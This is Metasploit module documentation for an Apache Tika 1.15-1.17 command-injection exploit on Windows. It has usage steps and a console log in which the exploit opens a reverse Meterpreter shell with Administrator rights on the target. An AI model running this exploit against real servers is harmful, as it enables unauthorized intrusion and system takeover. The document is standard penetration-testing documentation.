## Vulnerable Application

  This module works against Windows installations of Apache Tika 1.15-1.17, and was successfully tested on
  1.15-1.17.  Apache Tika can be downloaded from [here](https://archive.apache.org/dist/tika/), and requires Java to be installed.
  While the vulnerability is reported in more versions, exploitation was only successful against > 1.14 when jp2 was added as per
  [this comment](https://github.com/rapid7/metasploit-framework/pull/11653#issuecomment-516159557).

  Rhino Security Labs has an Excellent write-up describing this vulnerability.  Find it on
  [rhinosecuritylabs.com](https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/) or
  [wayback](https://web.archive.org/web/20190314101650/https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/).

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use exploits/windows/http/apache_tika_jp2_jscript```
  4. Do: ```run```
  5. You should get a shell.

## Scenarios

### 1.17 on Windows 2012 running as Administrator

```
resource (tika.rb)> use exploits/windows/http/apache_tika_jp2_jscript
resource (tika.rb)> set rhost 2.2.2.2
rhost => 2.2.2.2
resource (tika.rb)> set verbose true
verbose => true
resource (tika.rb)> check
[*] Apache Tika Version Detected: 1.17
[+] 2.2.2.2:9998 - The target is vulnerable.
resource (tika.rb)> run
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Powershell command length: 2278
[*] Sending PUT request to 2.2.2.2:9998/meta
[*] Sending stage (179779 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:49313) at 2019-03-28 21:33:09 -0400

meterpreter > getuid
Server username: WIN-OBKF2JFCDKL\Administrator
meterpreter > getpid
Current pid: 1552
meterpreter > sysinfo
Computer        : WIN-OBKF2JFCDKL
OS              : Windows 2012 (Build 9200).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```
